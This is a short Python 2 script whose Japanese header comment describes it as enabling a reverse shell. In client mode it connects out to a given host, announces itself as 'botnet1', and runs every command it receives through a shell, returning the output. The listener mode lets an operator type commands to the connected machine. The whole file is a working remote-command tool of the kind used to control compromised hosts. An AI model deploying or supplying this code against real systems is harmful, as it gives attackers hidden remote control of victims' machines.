#!/usr/bin/python
# coding: utf-8

#6/2 作成　リバースシェルが可能

import sys, socket, getopt, threading, subprocess

listen = False
target = ""
port = 0

def client_process():
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((target, port))
    print "Connected"
    message = "Hello from botnet1"
    c.send(message)
    while True:
        s_command = c.recv(4096)
        output = subprocess.check_output(s_command, stderr=subprocess.STDOUT, shell=True)
        c.send(output)


def server_process():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((target, port))
    print "[+] Listeninig on %s:%d" % (target, port)
    s.listen(5)
    c_socket, addr = s.accept()
    
    while True:
        print(c_socket.recv(4096))
	s_command = raw_input("$: ")
	c_socket.send(s_command)
	
    
def main():
    global listen
    global target
    global port
    
    usage = "Wrong Usage!!"
    if len(sys.argv[1:]) < 2:
        print usage
        sys.exit(0)
        
    try:
        opts, args = getopt.getopt(sys.argv[1:], "lt:p:")
    except getopt.GetoptError as err:
        print usage
    	
    for o, a in opts:
        if o in "-l":
            listen = True
        elif o in "-t":
            target = a
        elif o in "-p":
            port = int(a)
    
    if not listen and target and port > 0:
        client_process()
    
    if listen:
        server_process()
    
main()
